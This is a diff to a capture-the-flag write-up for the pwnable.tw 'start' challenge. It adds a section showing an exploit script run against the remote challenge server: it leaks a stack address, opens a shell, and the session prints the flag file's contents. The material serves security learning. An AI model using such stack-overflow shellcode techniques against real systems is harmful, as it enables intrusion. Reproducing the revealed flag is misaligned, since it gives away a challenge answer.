@@ -153,7 +153,7 @@ Found at offset 20
 
 And yes! We got the offset!
 
-# Exploit
+# Exploit Development
 
 The problem here is that we know we can inject the shellcode, but how can we get it to execute? My idea is to find a way to leak an address from somewhere and then calculate the starting address of our shellcode. So let's see what gadgets we have:
 
@@ -260,3 +260,20 @@ if __name__ == '__main__':
 ```
 
 P/S: My first shellcode didn’t look like this, but for some reason, it was still able to execute `execve`. So, I changed my approach to injecting `/bin/sh`.
+
+# Get flag
+
+```sh
+alter ^ Sol in ~/lab/pwnable.tw/start
+$ ./xpl.py REMOTE chall.pwnable.tw 10000
+[+] Opening connection to chall.pwnable.tw on port 10000: Done
+[+] Stack leak: 0xffd6b030
+[*] Switching to interactive mode
+\x01\x00\x00\x006\xbf\xd6\xff\x00\x00\x00\x00H\xbf\xd6\xff$ cd /home/start
+$ ls
+flag
+run.sh
+start
+$ cat flag
+FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
+```
